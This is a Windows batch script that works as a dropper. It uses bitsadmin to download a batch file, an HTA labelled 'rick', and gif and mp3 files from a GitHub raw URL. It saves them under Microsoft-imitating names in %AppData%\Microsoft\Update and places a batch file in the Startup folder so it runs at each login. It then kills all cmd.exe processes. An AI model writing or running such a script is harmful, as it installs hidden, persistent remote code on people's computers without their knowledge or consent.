@echo off

cls

mkdir "%AppData%\Microsoft\Update\User\Services"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Online/bgwork.bat" "%AppData%\Microsoft\Update\msrklbg.bat"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Online/rick.hta" "%AppData%\Microsoft\Update\msrkl.hta"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Online/start_menu.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\msrkl.bat"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Online/msrkl.gif" "%AppData%\Microsoft\Update\User\Services\msrkl.gif"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Temp/main/Online/msrkl.mp3" "%AppData%\Microsoft\Update\User\Services\msrkl.mp3"

taskkill /f /im cmd.exe
